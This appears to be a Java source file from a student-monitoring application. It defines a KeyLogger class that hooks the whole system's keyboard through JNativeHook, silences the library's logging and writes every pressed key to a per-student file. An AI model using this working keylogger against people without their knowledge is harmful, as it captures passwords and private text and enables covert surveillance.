package logger;

import client.Student;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLogger implements NativeKeyListener {

    final Student user;
    KeyLoggerFile kf;

    public KeyLogger(Student user) {
        this.user = user;
        kf = new KeyLoggerFile(user);

        try {
            GlobalScreen.registerNativeHook(); // Register Native Hook
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName()); // get access to log request
                                                                                         // from GlobalScreen
            logger.setLevel(Level.OFF); // set GlobalScreen log request to OFF
        } catch (NativeHookException e) {
            System.out.println("Error: " + e.getMessage());
        }

        GlobalScreen.addNativeKeyListener(this); // Listen the key event and internally invoke relative method
    }

    public static void main(String args[]) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent key) {
        // not required
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent key) {
        CharSequence text = NativeKeyEvent.getKeyText(key.getKeyCode()) + "\n";
        try {
            kf.keyLoggerWriter(text); // invoke keyloggerwriter method which store the key value.
        } catch (IOException e) {
            System.out.println("Error: " + e.getMessage());
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent key) {
        // not required
    }
}
